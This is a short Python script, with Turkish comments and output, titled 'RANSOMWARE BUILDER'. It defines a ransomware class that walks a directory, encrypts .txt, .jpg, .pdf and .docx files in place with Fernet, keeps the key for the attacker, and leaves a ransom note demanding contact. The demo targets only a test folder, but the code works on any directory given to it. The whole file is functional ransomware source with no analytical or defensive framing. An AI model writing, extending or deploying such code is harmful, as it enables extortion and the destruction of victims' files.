import os
from cryptography.fernet import Fernet

class Ransomware:
    def __init__(self, key=None):
        self.key = key or Fernet.generate_key()
        self.crypter = Fernet(self.key)
        self.target_exts = ['.txt', '.jpg', '.pdf', '.docx'] # Hedef uzantılar

    def save_key(self, filename="secret.key"):
        with open(filename, "wb") as f:
            f.write(self.key)

    def encrypt_file(self, file_path):
        try:
            with open(file_path, "rb") as f:
                data = f.read()
            encrypted_data = self.crypter.encrypt(data)
            with open(file_path, "wb") as f:
                f.write(encrypted_data)
            print(f"🔒 Şifrelendi: {file_path}")
        except Exception as e:
            print(f"Hata: {e}")

    def scan_and_encrypt(self, directory):
        print(f"--- Tarama Başlıyor: {directory} ---")
        for root, dirs, files in os.walk(directory):
            for file in files:
                ext = os.path.splitext(file)[1]
                if ext in self.target_exts:
                    full_path = os.path.join(root, file)
                    self.encrypt_file(full_path)
        
        self.drop_note(directory)

    def drop_note(self, directory):
        note = """
        ⚠️ DOSYALARINIZ ŞİFRELENDİ! ⚠️
        
        Çözmek için bana ulaşın.
        ID: 992-123-551
        """
        with open(os.path.join(directory, "README_RECOVER.txt"), "w", encoding="utf-8") as f:
            f.write(note)

# Kullanım
print("--- RANSOMWARE BUILDER ---")
target_dir = "test_files" # Test klasörü oluşturmayı unutma!
if not os.path.exists(target_dir): os.makedirs(target_dir)

# Simülasyon dosyası oluştur
with open(f"{target_dir}/gizli.txt", "w") as f: f.write("Banka şifrelerim...")

malware = Ransomware()
malware.save_key() # Anahtarı kaydet (Hacker kendine alır)
malware.scan_and_encrypt(target_dir)

print("\n✅ Operasyon Tamamlandı. 'secret.key' dosyasını kaybetme!")